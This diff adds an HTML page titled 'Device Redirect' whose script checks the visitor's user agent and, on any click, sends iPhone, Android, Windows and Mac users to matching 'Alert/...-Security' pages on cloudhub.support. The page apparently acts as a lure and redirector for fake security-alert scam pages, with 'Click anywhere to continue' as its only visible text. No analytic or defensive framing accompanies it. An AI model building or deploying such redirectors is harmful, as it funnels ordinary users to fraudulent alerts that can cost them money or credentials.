@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Device Redirect</title>
+  <script>
+    function detectAndRedirect() {
+      var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+      var redirectURL = '';
+
+      if (/iPhone/i.test(userAgent)) {
+        redirectURL = 'https://cloudhub.support/Alert/Apple-Security/';
+      } else if (/Android/i.test(userAgent)) {
+        redirectURL = 'https://cloudhub.support/Alert/Google-Security/';
+      } else if (/Windows NT/i.test(userAgent)) {
+        redirectURL = 'https://cloudhub.support/Alert/Windows-Security/';
+      } else if (/Macintosh/i.test(userAgent)) {
+        redirectURL = 'https://cloudhub.support/Alert/Windows-Security/';
+      } else {
+        redirectURL = 'https://cloudhub.support/Alert/Windows-Security/';
+      }
+
+      window.location.href = redirectURL;
+    }
+
+    document.addEventListener('click', function () {
+      detectAndRedirect();
+    });
+  </script>
+</head>
+<body>
+  <h1>Click anywhere to continue</h1>
+</body>
+</html>
